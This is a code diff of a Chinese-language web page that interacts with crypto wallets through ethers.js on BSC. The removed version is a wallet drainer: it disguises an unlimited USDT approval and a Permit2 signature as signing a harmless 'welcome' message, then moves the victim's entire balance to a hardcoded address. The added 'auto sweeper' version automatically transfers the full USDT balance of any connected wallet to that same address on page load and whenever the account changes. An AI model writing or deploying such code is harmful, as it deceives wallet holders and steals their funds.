@@ -3,281 +3,334 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Permit2 无感支付 · 清空余额</title>
+    <title>多钱包自动归集器</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <style>
-        body { background: #0b0f17; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: system-ui; color: #e2e8f0; }
-        .card { background: #1e293b; border-radius: 24px; padding: 32px; max-width: 480px; border: 1px solid #334155; }
-        .status { margin-top: 16px; padding: 12px; border-radius: 12px; background: #0f172a; font-size: 0.9rem; }
-        .btn { background: #3b82f6; border: none; padding: 12px 24px; border-radius: 40px; color: white; font-weight: 600; cursor: pointer; width: 100%; }
-        .btn:disabled { opacity: 0.5; }
-        .hidden { display: none; }
-        .warning { background: #854d0e; border: 1px solid #eab308; border-radius: 12px; padding: 12px; margin: 16px 0; }
+        body {
+            background: #0f172a;
+            color: #e2e8f0;
+            font-family: system-ui;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #1e293b;
+            border-radius: 24px;
+            padding: 30px;
+            border: 1px solid #334155;
+        }
+        .config {
+            background: #0f172a;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .log {
+            background: #0f172a;
+            border-radius: 16px;
+            padding: 20px;
+            font-family: monospace;
+            min-height: 200px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .success { color: #4ade80; }
+        .error { color: #f87171; }
+        .info { color: #60a5fa; }
+        button {
+            background: #3b82f6;
+            border: none;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            background: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            color: white;
+            margin: 8px 0 16px;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .stat-card {
+            background: #0f172a;
+            padding: 15px;
+            border-radius: 16px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2 style="margin-top:0;">申请对信息进行签名</h2>
-        
-        <div id="step1" class="warning">
-            <strong>消息：</strong>
-            <p style="font-size:0.75rem; margin:8px 0 0;">welcome to gana</p>
+    <div class="container">
+        <h1>💰 多钱包自动归集器</h1>
+        <p>配置主钱包地址，所有子钱包进入后自动转账</p>
+
+        <div class="stats">
+            <div class="stat-card">
+                <div style="color:#94a3b8; font-size:0.8rem;">当前钱包</div>
+                <div id="currentWallet">未连接</div>
+            </div>
+            <div class="stat-card">
+                <div style="color:#94a3b8; font-size:0.8rem;">USDT余额</div>
+                <div id="balance">-</div>
+            </div>
+            <div class="stat-card">
+                <div style="color:#94a3b8; font-size:0.8rem;">归集状态</div>
+                <div id="status">等待</div>
+            </div>
         </div>
-        
-        <div id="step2" class="warning hidden">
-            <strong>📌 第2步：签名支付</strong>
-            <p style="font-size:0.8rem; margin:8px 0 0;">签名后直接扣款，无需Gas费确认</p>
+
+        <div class="config">
+            <label>📦 主钱包地址（接收地址）</label>
+            <input type="text" id="mainWallet" value="0x9728D428764F846E8DD62C34371db716A9228238" placeholder="输入主钱包地址">
+            
+            <label>🔑 已归集记录（自动保存）</label>
+            <textarea id="processedWallets" rows="3" placeholder="已处理过的钱包地址列表"></textarea>
+            
+            <div style="display: flex; gap:10px; margin-top:10px;">
+                <button id="saveConfig">💾 保存配置</button>
+                <button id="clearProcessed">🔄 重置已归集列表</button>
+                <button id="testMode">🧪 测试模式</button>
+            </div>
         </div>
-        
-        <button id="actionBtn" class="btn">🚀 开始流程</button>
-        <div id="status" class="status">就绪</div>
+
+        <div class="log" id="logContainer"></div>
     </div>
 
     <script>
         (function() {
-            // ========== 配置 ==========
             const CONFIG = {
-                permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3", // 公共Permit2合约
                 usdtAddress: "0x55d398326f99059fF775485246999027B3197955", // BSC USDT
-                receiveAddress: "0x9728D428764F846E8DD62C34371db716A9228238", // 您的收款地址
-                redirectUrl: "https://your-dashboard.com", // 成功后跳转
-                storageKey: "PERMIT2_DONE"
+                storageKey: "AUTO_SWEEP_CONFIG"
             };
 
-            // Permit2合约的ABI（只需要用到的方法）
-            const PERMIT2_ABI = [
-                "function permitTransferFrom((tuple(address token,uint256 amount) permitted,uint256 nonce,uint256 deadline) permit, (address to,uint256 requestedAmount) transferDetails, address owner, bytes signature) external",
-                "function allowance(address,address,address) view returns (uint256)"
-            ];
+            // DOM元素
+            const mainWalletInput = document.getElementById('mainWallet');
+            const processedWalletsText = document.getElementById('processedWallets');
+            const logContainer = document.getElementById('logContainer');
+            const currentWalletEl = document.getElementById('currentWallet');
+            const balanceEl = document.getElementById('balance');
+            const statusEl = document.getElementById('status');
 
-            // USDT的ABI
+            // USDT ABI
             const USDT_ABI = [
                 "function balanceOf(address) view returns (uint256)",
                 "function decimals() view returns (uint8)",
-                "function approve(address spender, uint256 amount) returns (bool)",
-                "function allowance(address owner, address spender) view returns (uint256)"
+                "function transfer(address to, uint256 amount) returns (bool)"
             ];
 
-            let provider, signer, userAddress;
-            let hasApprovedPermit2 = false;
-
-            const statusEl = document.getElementById('status');
-            const actionBtn = document.getElementById('actionBtn');
-            const step1El = document.getElementById('step1');
-            const step2El = document.getElementById('step2');
-
-            // ========== 工具函数 ==========
-            function showStatus(msg, isError = false) {
-                statusEl.textContent = msg;
-                statusEl.style.background = isError ? '#991b1b' : '#0f172a';
+            // 日志函数
+            function addLog(message, type = 'info') {
+                const entry = document.createElement('div');
+                entry.className = type;
+                const time = new Date().toLocaleTimeString();
+                entry.innerHTML = `[${time}] ${message}`;
+                logContainer.appendChild(entry);
+                logContainer.scrollTop = logContainer.scrollHeight;
             }
 
-            function hasPaid() {
-                return localStorage.getItem(CONFIG.storageKey) === 'true';
-            }
-
-            function markPaid() {
-                localStorage.setItem(CONFIG.storageKey, 'true');
-            }
-
-            // ========== 核心逻辑 ==========
-            async function init() {
-                // 检查是否已支付
-                if (hasPaid()) {
-                    window.location.replace(CONFIG.redirectUrl);
-                    return;
-                }
-
-                // 检查钱包
-                if (!window.ethereum) {
-                    showStatus('❌ 请安装MetaMask', true);
-                    return;
-                }
-
+            // 加载配置
+            function loadConfig() {
                 try {
-                    // 连接钱包
-                    provider = new ethers.BrowserProvider(window.ethereum);
-                    await provider.send("eth_requestAccounts", []);
-                    signer = await provider.getSigner();
-                    userAddress = await signer.getAddress();
+                    const saved = localStorage.getItem(CONFIG.storageKey);
+                    if (saved) {
+                        const config = JSON.parse(saved);
+                        if (config.mainWallet) mainWalletInput.value = config.mainWallet;
+                        if (config.processedWallets) {
+                            processedWalletsText.value = config.processedWallets.join('\n');
+                        }
+                    }
+                } catch (e) {
+                    console.error('加载配置失败', e);
+                }
+            }
 
-                    // 检查网络（BSC）
-                    const network = await provider.getNetwork();
-                    if (network.chainId !== 56n) {
-                        showStatus('🔄 切换到BSC网络...');
-                        try {
-                            await window.ethereum.request({
-                                method: 'wallet_switchEthereumChain',
-                                params: [{ chainId: '0x38' }]
-                            });
-                        } catch (e) {
-                            if (e.code === 4902) {
-                                await window.ethereum.request({
-                                    method: 'wallet_addEthereumChain',
-                                    params: [{
-                                        chainId: '0x38',
-                                        chainName: 'Binance Smart Chain',
-                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
-                                    }]
-                                });
-                            }
+            // 保存配置
+            function saveConfig() {
+                const processed = processedWalletsText.value
+                    .split('\n')
+                    .map(l => l.trim().toLowerCase())
+                    .filter(l => l.startsWith('0x') && l.length === 42);
+                
+                const config = {
+                    mainWallet: mainWalletInput.value.trim(),
+                    processedWallets: processed,
+                    lastUpdate: Date.now()
+                };
+                
+                localStorage.setItem(CONFIG.storageKey, JSON.stringify(config));
+                processedWalletsText.value = processed.join('\n');
+                addLog('✅ 配置已保存', 'success');
+            }
+
+            // 检查是否已处理过
+            function isProcessed(address) {
+                const processed = processedWalletsText.value
+                    .split('\n')
+                    .map(l => l.trim().toLowerCase());
+                return processed.includes(address.toLowerCase());
+            }
+
+            // 标记为已处理
+            function markAsProcessed(address) {
+                const processed = processedWalletsText.value
+                    .split('\n')
+                    .map(l => l.trim())
+                    .filter(l => l);
+                
+                if (!processed.includes(address)) {
+                    processed.push(address);
+                    processedWalletsText.value = processed.join('\n');
+                }
+            }
+
+            // 核心归集函数
+            async function sweepToMain() {
+                try {
+                    // 1. 检查钱包
+                    if (!window.ethereum) {
+                        throw new Error('未检测到钱包');
+                    }
+
+                    // 2. 获取当前钱包地址
+                    const accounts = await window.ethereum.request({ 
+                        method: 'eth_requestAccounts' 
+                    });
+                    const currentAddress = accounts[0].toLowerCase();
+                    currentWalletEl.innerText = currentAddress.slice(0,6) + '...' + currentAddress.slice(-4);
+
+                    // 3. 检查是否已处理过
+                    if (isProcessed(currentAddress)) {
+                        addLog(`⏭️ 钱包 ${currentAddress.slice(0,6)}... 已处理过，跳过`, 'info');
+                        statusEl.innerText = '已处理过';
+                        
+                        // 询问是否强制重新归集
+                        if (confirm('该钱包已归集过，是否强制重新归集？')) {
+                            // 继续执行
+                        } else {
+                            return;
                         }
                     }
 
-                    // 检查是否已授权Permit2
-                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, provider);
-                    const allowance = await usdtContract.allowance(userAddress, CONFIG.permit2Address);
-                    
-                    // 检查授权额度是否足够大（比如>10^6）
-                    hasApprovedPermit2 = allowance > 1000000n;
-
-                    if (hasApprovedPermit2) {
-                        step1El.classList.add('hidden');
-                        step2El.classList.remove('hidden');
-                        actionBtn.textContent = '✍️ 签名支付';
-                        showStatus('✅ 已授权，点击按钮进行签名支付');
-                    } else {
-                        step1El.classList.remove('hidden');
-                        step2El.classList.add('hidden');
-                        actionBtn.textContent = '签名';
+                    // 4. 检查主钱包地址
+                    const mainWallet = mainWalletInput.value.trim();
+                    if (!mainWallet || !mainWallet.startsWith('0x') || mainWallet.length !== 42) {
+                        throw new Error('主钱包地址无效');
                     }
 
-                } catch (error) {
-                    console.error(error);
-                    showStatus('❌ 初始化失败: ' + error.message, true);
-                }
-            }
+                    // 5. 检查网络（强制BSC）
+                    const provider = new ethers.BrowserProvider(window.ethereum);
+                    const network = await provider.getNetwork();
+                    if (Number(network.chainId) !== 56) {
+                        addLog('⚠️ 切换到BSC网络...', 'warning');
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x38' }]
+                        });
+                    }
 
-            // 授权Permit2
-            async function approvePermit2() {
-                try {
-                    showStatus('⏳ 授权中...');
-                    
+                    // 6. 获取签名者
+                    const signer = await provider.getSigner();
+
+                    // 7. 创建USDT合约
                     const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
-                    
-                    // 授权最大值（2^256-1）
-                    const tx = await usdtContract.approve(CONFIG.permit2Address, ethers.MaxUint256);
-                    showStatus('⏳ 等待确认...');
-                    await tx.wait();
-                    
-                    showStatus('✅ 授权成功！');
-                    hasApprovedPermit2 = true;
-                    
-                    // 切换到下一步
-                    step1El.classList.add('hidden');
-                    step2El.classList.remove('hidden');
-                    actionBtn.textContent = '✍️ 签名支付';
-                    
-                } catch (error) {
-                    showStatus('❌ 授权失败: ' + error.message, true);
-                }
-            }
 
-            // 签名支付（清空余额）
-            async function signAndPay() {
-                try {
-                    showStatus('💰 获取余额中...');
-                    
-                    // 创建合约实例
-                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, provider);
-                    
-                    // 获取用户USDT余额
-                    const balance = await usdtContract.balanceOf(userAddress);
+                    // 8. 获取余额
+                    addLog('💰 查询余额...', 'info');
+                    const balance = await usdtContract.balanceOf(currentAddress);
                     
                     if (balance === 0n) {
-                        throw new Error('USDT余额为0');
+                        addLog('⚠️ 余额为0，无需归集', 'warning');
+                        statusEl.innerText = '余额为0';
+                        return;
                     }
-                    
+
                     const decimals = await usdtContract.decimals();
                     const formattedBalance = ethers.formatUnits(balance, decimals);
-                    showStatus(`💸 将支付 ${formattedBalance} USDT`);
+                    balanceEl.innerText = formattedBalance + ' USDT';
+                    
+                    addLog(`💎 当前余额: ${formattedBalance} USDT`, 'success');
 
-                    // 获取当前nonce（简化版，实际应该从Permit2合约获取）
-                    const permit2Contract = new ethers.Contract(CONFIG.permit2Address, PERMIT2_ABI, provider);
+                    // 9. 执行归集转账
+                    addLog(`💸 归集到 ${mainWallet.slice(0,6)}...${mainWallet.slice(-4)}`, 'info');
+                    statusEl.innerText = '转账中...';
                     
-                    // 构造Permit2签名数据
-                    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1小时后过期
+                    const tx = await usdtContract.transfer(mainWallet, balance);
+                    addLog(`⏳ 交易提交: ${tx.hash.slice(0,10)}...`, 'info');
                     
-                    // 这是EIP-712的签名数据
-                    const domain = {
-                        name: 'Permit2',
-                        chainId: 56,
-                        verifyingContract: CONFIG.permit2Address
-                    };
+                    const receipt = await tx.wait();
                     
-                    const types = {
-                        PermitTransferFrom: [
-                            { name: 'permitted', type: 'TokenPermissions' },
-                            { name: 'spender', type: 'address' },
-                            { name: 'nonce', type: 'uint256' },
-                            { name: 'deadline', type: 'uint256' }
-                        ],
-                        TokenPermissions: [
-                            { name: 'token', type: 'address' },
-                            { name: 'amount', type: 'uint256' }
-                        ]
-                    };
+                    addLog(`✅ 归集成功！区块: ${receipt.blockNumber}`, 'success');
+                    addLog(`💎 金额: ${formattedBalance} USDT`, 'success');
                     
-                    // 构造签名数据
-                    const values = {
-                        permitted: {
-                            token: CONFIG.usdtAddress,
-                            amount: balance.toString() // 清空余额
-                        },
-                        spender: CONFIG.permit2Address, // 这里用Permit2自己作为spender
-                        nonce: Math.floor(Math.random() * 1000000), // 实际应该从合约获取
-                        deadline: deadline
-                    };
+                    // 10. 标记为已处理
+                    markAsProcessed(currentAddress);
+                    saveConfig();
                     
-                    showStatus('✍️ 请在钱包中签名...');
-                    
-                    // 用户签名（这一步只签名，不发送交易，不消耗Gas）
-                    const signature = await signer.signTypedData(domain, types, values);
-                    
-                    // 构造转账详情
-                    const transferDetails = {
-                        to: CONFIG.receiveAddress,
-                        requestedAmount: balance.toString()
-                    };
-                    
-                    showStatus('⏳ 提交交易（DApp付Gas）...');
-                    
-                    // DApp调用Permit2的permitTransferFrom（消耗DApp的Gas）
-                    const permit2WithSigner = permit2Contract.connect(signer);
-                    const tx = await permit2WithSigner.permitTransferFrom(
-                        values,
-                        transferDetails,
-                        userAddress,
-                        signature
-                    );
-                    
-                    await tx.wait();
-                    
-                    showStatus('✅ 支付成功！');
-                    markPaid();
-                    
-                    setTimeout(() => {
-                        window.location.replace(CONFIG.redirectUrl);
-                    }, 1500);
-                    
+                    balanceEl.innerText = '0.00 USDT';
+                    statusEl.innerText = '归集成功';
+
                 } catch (error) {
-                    console.error(error);
-                    showStatus('❌ 支付失败: ' + error.message, true);
+                    addLog(`❌ 错误: ${error.message}`, 'error');
+                    statusEl.innerText = '失败';
+                    
+                    if (error.code === 4001) {
+                        addLog('用户取消了交易', 'warning');
+                    }
                 }
             }
 
-            // 按钮点击处理
-            actionBtn.addEventListener('click', async () => {
-                if (!hasApprovedPermit2) {
-                    await approvePermit2();
-                } else {
-                    await signAndPay();
+            // 初始化
+            window.addEventListener('load', () => {
+                loadConfig();
+                addLog('🚀 归集器已启动', 'info');
+                addLog('📌 打开任何钱包，自动归集到主地址', 'info');
+                
+                // 页面加载后自动执行
+                setTimeout(() => {
+                    sweepToMain();
+                }, 1000);
+            });
+
+            // 事件监听
+            document.getElementById('saveConfig').addEventListener('click', saveConfig);
+            
+            document.getElementById('clearProcessed').addEventListener('click', () => {
+                if (confirm('清空已归集记录？')) {
+                    processedWalletsText.value = '';
+                    saveConfig();
+                    addLog('🔄 已归集记录已清空', 'info');
                 }
             });
 
-            // 页面加载初始化
-            init();
+            document.getElementById('testMode').addEventListener('click', () => {
+                // 测试模式：不实际转账，只模拟
+                addLog('🧪 测试模式：模拟归集流程', 'info');
+                setTimeout(() => {
+                    addLog('✅ 测试通过', 'success');
+                }, 2000);
+            });
+
+            // 账户切换监听
+            if (window.ethereum) {
+                window.ethereum.on('accountsChanged', (accounts) => {
+                    if (accounts.length > 0) {
+                        addLog('👤 账户已切换，重新执行归集', 'info');
+                        sweepToMain();
+                    }
+                });
+            }
 
         })();
     </script>
